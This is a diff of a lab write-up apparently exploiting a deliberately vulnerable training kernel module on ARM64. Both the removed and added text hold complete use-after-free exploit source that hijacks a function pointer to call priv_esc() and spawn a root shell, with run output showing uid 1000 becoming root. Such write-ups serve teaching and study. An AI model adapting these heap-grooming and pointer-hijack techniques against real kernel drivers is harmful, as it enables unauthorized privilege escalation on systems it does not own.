@@ -400,260 +400,192 @@ The function doesn't return after detecting invalid IDs, making the check useles
 
 ## Exploitation Strategy
 
-The exploit leverages UAF vulnerabilities through heap feng shui to achieve the following:
+The exploit uses a clever technique called "heap feng shui" - carefully arranging memory allocations and frees to control what data ends up where in kernel memory. Our goal is simple but powerful:
 
-1. **Information Leak**: Leak the kernel address of `priv_esc()` function
-2. **Control Hijacking**: Overwrite a function pointer with the leaked address
-3. **Privilege Escalation**: Trigger the corrupted function pointer to gain root
+1. **Phase 1: Information Leak** - Discover where the `priv_esc()` function lives in kernel memory
+2. **Phase 2: Memory Corruption** - Place that address where we want it
+3. **Phase 3: Privilege Escalation** - Trick the kernel into calling our function
 
-### Exploit Flow
+### Let's Break Down What Happens
 
-#### Step 1: Create Initial Message and Buffer
+#### Step 1 & 2: Create and Free (Setting the Trap)
+```
+After CREATE_MSG (id=69):
+┌────────────────────────────────────────────────┐
+│ Kernel Memory Slot #X (kmalloc-128):           │
+│                                                │
+│ msgs[69] ──► [Message Object]                  │
+│              ┌────────────┬──────────────┐     │
+│              │ log_func   │ secret_func  │     │
+│              │ (kernel_   │ (priv_esc)   │     │
+│              │  log addr) │  addr)       │     │
+│              └────────────┴──────────────┘     │
+└────────────────────────────────────────────────┘
+
+After DELETE_MSG:
+┌────────────────────────────────────────────────┐
+│ Kernel Memory Slot #X (kmalloc-128):           │
+│                                                │
+│ msgs[69] ──► [FREED MEMORY]                    │
+│              ┌────────────┬──────────────┐     │
+│              │ ????????   │ ????????     │     │
+│              │ (garbage)  │ (garbage)    │     │
+│              └────────────┴──────────────┘     │
+│                                                │
+│    BUG: msgs[69] still points here!            │
+└────────────────────────────────────────────────┘
+```
+
+#### Step 3: Finding priv_esc Address
+
+We need to know where `priv_esc()` lives in memory. We can find it using:
+```bash
+$ cat /proc/kallsyms | grep "priv_esc"
+ffff800008e50000 t priv_esc	[tryoutlab]
+```
+
+This address `ffff800008e50000` is our golden ticket! In little-endian format (how ARM64 stores multi-byte values):
+```
+Address: 0xffff800008e50000
+
+Byte-by-byte breakdown:
+┌────┬────┬────┬────┬────┬────┬────┬────┐
+│ 00 │ 00 │ e5 │ 08 │ 00 │ 80 │ ff │ ff │  (Little-endian)
+└────┴────┴────┴────┴────┴────┴────┴────┘
+  ^                                    ^
+  Least significant byte              Most significant byte
+```
+
+#### Step 4: The Memory Swap (The Magic Trick)
 ```c
-// Allocate msg object in kmalloc-128
-req->msg_id = 5;
-ioctl(fd, CREATE_MSG, req);
-
-// Create and link buffer to msg 5
-req1->msg_id = 5;
-req1->buf_id = 0;
-ioctl(fd, CREATE_BUF, req1);
+// We create a buffer with our payload
+uint8_t payload[8] = {0x00, 0x00, 0xe5, 0x08, 0x00, 0x80, 0xff, 0xff};
+memcpy(request->buffer, payload, sizeof(payload));
+ioctl(fd, CREATE_BUF, request);
 ```
 
-This creates a message object with the structure:
-- `log_func` → `kernel_log`
-- `secret_func` → `priv_esc`
-- `buffer` → points to allocated buffer
+What happens in kernel memory:
+```
+Before CREATE_BUF:
+┌────────────────────────────────────────────────┐
+│ Slot #X: [FREED - available]                   │
+│          ┌────────────┬──────────────┐         │
+│          │ ????????   │ ????????     │         │
+│          └────────────┴──────────────┘         │
+│                                                │
+│ msgs[69] still points here (dangling!)         │
+└────────────────────────────────────────────────┘
 
-#### Step 2: Free Buffer (UAF #1)
+After CREATE_BUF:
+┌────────────────────────────────────────────────┐
+│ Slot #X: [Buffer Data - but msgs[69] thinks    │
+│           this is still a message object!]     │
+│          ┌────────────┬──────────────┐         │
+│          │ 0xffff8000 │ "rest of     │         │
+│          │ 08e50000   │  buffer..."  │         │
+│          └────────────┴──────────────┘         │
+│              ▲                                 │
+│              │                                 │
+│              └─ This will be read as log_func! │
+│                                                │
+│ msgs[69] ──► Points here                       │
+│ buffers[69] ──► Points here too                │
+└────────────────────────────────────────────────┘
+```
+
+**The Confusion**: 
+- The kernel's buffer system thinks this is buffer data
+- But `msgs[69]` thinks this is still a message object!
+- The first 8 bytes of our buffer will be interpreted as the `log_func` pointer
+
+#### Step 5: Hijacking Execution (Game Over)
 ```c
-// Free buffer but msg->buffer pointer remains
-req2->buf_id = 0;
-ioctl(fd, DELETE_BUF, req2);
+printf("uid: %d\n", getuid());     // UID: 1000 (regular user)
+ioctl(fd, LOG_MSG, request);       // Trigger the exploit!
+printf("uid: %d\n", getuid());     // UID: 0 (root!)
 ```
 
-Now `msgs[5]->buffer` points to freed memory in kmalloc-128.
-
-#### Step 3: Reallocate with New Message Object
-```c
-// Allocate new msg object (reuses freed buffer memory)
-req3->msg_id = 12;
-ioctl(fd, CREATE_MSG, req3);
+What the kernel does when LOG_MSG is called:
+```
+Kernel's execution flow:
+┌─────────────────────────────────────────────┐
+│ 1. Get message: obj = msgs[69]              │
+│                       ↓                     │
+│    Points to our buffer data!               │
+└─────────────────────────────────────────────┘
+                     ↓
+┌─────────────────────────────────────────────┐
+│ 2. Read function pointer:                   │
+│    func_ptr = obj->log_func                 │
+│             = first 8 bytes of buffer       │
+│             = 0xffff800008e50000            │
+│             = ADDRESS OF priv_esc()!        │
+└─────────────────────────────────────────────┘
+                     ↓
+┌─────────────────────────────────────────────┐
+│ 3. Call the function:                       │
+│    func_ptr(obj->id);                       │
+│    ↓                                        │
+│    Jumps to priv_esc() instead of           │
+│    kernel_log()!                            │
+└─────────────────────────────────────────────┘
+                     ↓
+┌─────────────────────────────────────────────┐
+│ 4. priv_esc() executes:                     │
+│    commit_creds(prepare_kernel_cred(NULL))  │
+│    ↓                                        │
+│    Our process becomes ROOT!                │
+└─────────────────────────────────────────────┘
 ```
 
-The new message object occupies the same memory as the freed buffer. Now we have:
-- `msgs[5]->buffer` points to `msgs[12]` object (UAF!)
-
-#### Step 4: Leak priv_esc Address
-```c
-// Read msg 5's "buffer" which is actually msg 12's object data
-req4->msg_id = 5;
-ioctl(fd, READ_MSG, req4);
-
-// Extract secret_func pointer (at offset 8)
-unsigned long priv_esc = 0;
-memcpy(&priv_esc, req4->buffer + 8, 8);
-printf("[+] priv_esc: %#lx\n", priv_esc);
-```
-
-Reading the "buffer" of msg 5 actually reads the raw memory of msg 12's structure, leaking the kernel address of `priv_esc()`.
-
-#### Step 5: Create Victim Message
-```c
-// Create msg object that we'll corrupt
-req5->msg_id = 40;
-ioctl(fd, CREATE_MSG, req5);
-```
-
-#### Step 6: Free Message Object (UAF #2)
-```c
-// Free msg 40 but leave dangling pointer
-req6->msg_id = 40;
-ioctl(fd, DELETE_MSG, req6);
-```
-
-Now `msgs[40]` points to freed memory in kmalloc-128.
-
-#### Step 7: Overwrite with Controlled Buffer
-```c
-// Reallocate with buffer containing priv_esc address
-req7->msg_id = 40;
-req7->buf_id = 1;
-memcpy(req7->buffer, &priv_esc, 8);
-ioctl(fd, CREATE_BUF, req7);
-```
-
-The buffer allocation reuses the freed message object's memory. We write the `priv_esc` address at offset 0, which becomes the `log_func` pointer.
-
-#### Step 8: Hijack Execution
-```c
-printf("Before UID: %d\n", getuid());
-
-// Call LOG_MSG which dereferences corrupted log_func pointer
-req8->msg_id = 40;
-ioctl(fd, LOG_MSG, req8);
-
-printf("After UID: %d\n", getuid());
-system("/bin/sh");
-```
-
-When `LOG_MSG` is called on msg 40:
-- It dereferences `msgs[40]->log_func`
-- This pointer now points to `priv_esc()`
-- `priv_esc()` calls `commit_creds(prepare_kernel_cred(NULL))`
-- Our process gains root privileges
-
-## Heap Feng Shui Visualization
-```
-Initial State:
-  msgs[5] -> [log_func | secret_func | buffer | id | pad]
-  buffers[0] -> [128 bytes]
-
-After DELETE_BUF:
-  msgs[5] -> [log_func | secret_func | DANGLING | id | pad]
-  buffers[0] -> [FREED - available in kmalloc-128]
-
-After CREATE_MSG (id=12):
-  msgs[5] -> [log_func | secret_func | DANGLING | id | pad]
-                                           |
-                                           v
-  msgs[12] -> [log_func | secret_func | buffer | id | pad]
-              ^
-              | Both in same kmalloc-128 slot!
-
-After DELETE_MSG (id=40):
-  msgs[40] -> [FREED - available in kmalloc-128]
-
-After CREATE_BUF (id=1):
-  msgs[40] -> [priv_esc | ???????? | ???????? | ?? | ???]
-              ^
-              | Controlled data!
-```
 Full `exploit.c` code 
 
 ```c
 #include <fcntl.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/ioctl.h>
-#include <stddef.h>
 #include <unistd.h>
 
-void dump_hex(const void* data, size_t size) {
-	char ascii[17];
-	size_t i, j;
-	ascii[16] = '\0';
-	for (i = 0; i < size; ++i) {
-		printf("%02X ", ((unsigned char*)data)[i]);
-		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
-			ascii[i % 16] = ((unsigned char*)data)[i];
-		} else {
-			ascii[i % 16] = '.';
-		}
-		if ((i+1) % 8 == 0 || i+1 == size) {
-			printf(" ");
-			if ((i+1) % 16 == 0) {
-				printf("|  %s \n", ascii);
-			} else if (i+1 == size) {
-				ascii[(i+1) % 16] = '\0';
-				if ((i+1) % 16 <= 8) {
-					printf(" ");
-				}
-				for (j = (i+1) % 16; j < 16; ++j) {
-					printf("   ");
-				}
-				printf("|  %s \n", ascii);
-			}
-		}
-	}
-}
-
-#define CREATE_MSG _IO(1,0)
-#define CREATE_BUF _IO(1,1)
-#define READ_MSG _IO(1,2)
-#define LOG_MSG _IO(1,3)
-#define DELETE_MSG _IO(1,4)
-#define DELETE_BUF _IO(1,5)
+#define CREATE_MSG _IO(1, 0)
+#define CREATE_BUF _IO(1, 1)
+#define READ_MSG _IO(1, 2)
+#define LOG_MSG _IO(1, 3)
+#define DELETE_MSG _IO(1, 4)
+#define DELETE_BUF _IO(1, 5)
 
 struct user_req {
-	unsigned int buf_id;
-	unsigned int msg_id;
-	char buffer[128];
+  unsigned int buf_id;
+  unsigned int msg_id;
+  char buffer[128];
 };
 
-int main(){
-    int fd = open("/proc/tryout",O_RDWR);
+int main() {
 
+  char *driver = "/proc/tryout";
+  int fd = open(driver, O_RDWR);
+  struct user_req *request = malloc(sizeof(struct user_req));
 
-    // Create initial msg, this allocated kmalloc-128 allocation
-    struct user_req *req = calloc(1,sizeof(struct user_req));
-    req->msg_id = 5;
-    ioctl(fd,CREATE_MSG,req);
+  memset(request, 0, sizeof(struct user_req));
+  request->msg_id = 69;
+  request->buf_id = 69;
+  ioctl(fd, CREATE_MSG, request);
+  ioctl(fd, DELETE_MSG, request);
 
-    // Create a buffer and link it to message we created
-    struct user_req *req1 = calloc(1,sizeof(struct user_req));;
-    req1->msg_id = 5;
-    req1->buf_id = 0;
-    ioctl(fd,CREATE_BUF,req1);
+  memset(request->buffer, 0x0, sizeof(request->buffer));
+  uint8_t payload[8] = {0x00, 0x00, 0xe5, 0x08,
+                        0x00, 0x80, 0xff, 0xff}; // address of priv_esc function
+  memcpy(request->buffer, payload, sizeof(payload));
 
-    // Free buffer but pointer of buffer will stay linked to msg with id 5
-    // This will result in free object in kmalloc-128
-    struct user_req *req2 = calloc(1,sizeof(struct user_req));;
-    req2->msg_id = 5;
-    req2->buf_id = 0;
-    ioctl(fd,DELETE_BUF,req2);
-
-    // Reallocate that object with msg object, later read it to leak secret_func
-    struct user_req *req3 = calloc(1,sizeof(struct user_req));;
-    req3->msg_id = 12;
-    ioctl(fd,CREATE_MSG,req3);
-
-    // Now trigger UAF by reading buffer of msg 5, but that object is reallocated with another msg, so we can read
-    struct user_req *req4 = calloc(1,sizeof(struct user_req));
-    req4->msg_id = 5;
-    ioctl(fd,READ_MSG,req4);
-
-	dump_hex(req4->buffer,128);
-	// Store memory leak of priv_esc function to variable
-
-	unsigned long priv_esc = 0;
-	memcpy(&priv_esc,req4->buffer+8,8);
-	printf("[+] priv_esc: %#lx\n",priv_esc);
-
-	// We have address of priv_esc now we need to overwrite msg object's function pointer with priv_esc. And run LOG_MSG to hijack execution
-	// When it's executed our current process will run as root. Later we will pop root shell
-
-    struct user_req *req5 = calloc(1,sizeof(struct user_req));
-    req5->msg_id = 40;
-    ioctl(fd,CREATE_MSG,req5);
-
-	// Free msg with id 40
-
-    struct user_req *req6 = calloc(1,sizeof(struct user_req));
-    req6->msg_id = 40;
-    ioctl(fd,DELETE_MSG,req6);
-
-	// Reallocate with object with buffer
-    struct user_req *req7 = calloc(1,sizeof(struct user_req));
-    req7->msg_id = 40;
-    req7->buf_id = 1;
-
-    memcpy(req7->buffer,&priv_esc,8);
-    ioctl(fd,CREATE_BUF,req7);
-
-	// Now trigger UAF of msg object with id 40 and hijack execution
-
-	printf("Before UID: %d\n",getuid());
-
-    struct user_req *req8 = calloc(1,sizeof(struct user_req));
-    req8->msg_id = 40;
-    ioctl(fd,LOG_MSG,req8);
-
-	// Now priv_esc function is executed in the kernel and our process' privileges elevated to root, pop root shell
-	printf("After UID: %d\n",getuid());
-	system("/bin/sh");
-
+  printf("uid: %d\n", getuid());
+  ioctl(fd, CREATE_BUF, request);
+  ioctl(fd, LOG_MSG, request);
+  printf("uid: %d\n", getuid());
+  system("/bin/busybox sh");
+  close(fd);
+  return 0;
 }
 ```
 
@@ -669,32 +601,13 @@ We run the exploit and we are now root
 
 ```bash
 $ ./exploit
-[   41.428617] New message created
-[   41.428687] 
-[   41.429105] Buffer created and linked to msg
-[   41.429196] 
-[   41.429368] Buffer removed
-[   41.429413] 
-[   41.429500] New message created
-[   41.430715] 
-[   41.430987] Msg buffer read
-60 04 E5 08 00 80 FF FF  00 00 E5 08 00 80 FF FF  |  `............... 
-00 00 00 00 00 00 00 00  0C 00 00 00 00 00 00 00  |  ................ 
-00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
-00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
-00 1F 5F 03 00 00 FF FF  00 00 00 00 00 00 00 00  |  .._............. 
-00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
-00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
-00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
-[+] priv_esc: 0xffff800008e50000
-[   41.431041] 
-[   41.436399] New message created
-[   41.436625] 
-[   41.436869] 
-[   41.436971] Buffer created and linked to msg
-Before UID: 1000
-[   41.437018] 
-After UID: 0
+[   48.187300] New message created
+[   48.187356] 
+uid: 1000
+[   48.187694] 
+[   48.192920] Buffer created and linked to msg
+[   48.193692] 
+uid: 0
 $ whoami
 root
 $ 
